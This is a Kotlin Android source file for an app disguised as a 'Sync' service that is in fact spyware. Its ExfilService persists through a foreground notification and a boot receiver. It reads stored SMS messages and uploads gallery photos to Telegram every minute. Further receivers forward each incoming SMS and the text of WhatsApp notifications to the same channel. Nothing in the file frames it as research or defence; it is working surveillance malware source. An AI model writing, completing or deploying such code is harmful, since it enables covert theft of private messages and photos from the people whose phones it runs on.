package com.example.sync

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.provider.Telephony
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class ExfilService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startFg()
        if (job?.isActive != true) job = scope.launch { loop() }
        return START_STICKY
    }

    private fun startFg() {
        val ch = "c"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(NotificationChannel(ch, "sync", NotificationManager.IMPORTANCE_LOW))
        }
        val n = NotificationCompat.Builder(this, ch)
            .setContentTitle("Sync")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .build()
        if (Build.VERSION.SDK_INT >= 34)
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(1, n)
    }

    private suspend fun loop() {
        var first = true
        while (currentCoroutineContext().isActive) {
            try {
                if (first) {
                    val sms = SmsReader.readAll(this, 300)
                    if (sms.isNotEmpty())
                        Telegram.sendText("📩 SMS (" + sms.size + ")\n" + sms.joinToString("\n"))
                    first = false
                }
                sendPhotos()
            } catch (_: Exception) {}
            delay(60_000)
        }
    }

    private fun sendPhotos() {
        val prefs = getSharedPreferences("p", MODE_PRIVATE)
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val proj = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
        contentResolver.query(uri, proj, null, null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { c ->
            val idc = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nc = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            var count = 0
            while (c.moveToNext() && count < 20) {
                val id = c.getLong(idc)
                if (prefs.getBoolean("s$id", false)) continue
                val name = c.getString(nc) ?: "img_$id.jpg"
                val fu = ContentUris.withAppendedId(uri, id)
                try {
                    contentResolver.openInputStream(fu)?.use { input ->
                        if (Telegram.sendDocument(input, name, "image/jpeg"))
                            prefs.edit().putBoolean("s$id", true).apply()
                    }
                } catch (_: Exception) {}
                count++
                Thread.sleep(1200)
            }
        }
    }

    override fun onDestroy() { scope.cancel(); super.onDestroy() }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
            val i = Intent(ctx, ExfilService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        for (m in msgs) {
            val from = m.originatingAddress ?: "?"
            val body = m.messageBody ?: ""
            Telegram.sendText("📩 SMS من $from:\n$body")
        }
    }
}

class NotifListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
        val e = sbn.notification?.extras ?: return
        val title = e.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = e.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
        val big = e.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString()
        if (title.isBlank() && text.isBlank()) return
        Telegram.sendText("💬 WhatsApp\n$title\n${big ?: text}")
    }
}
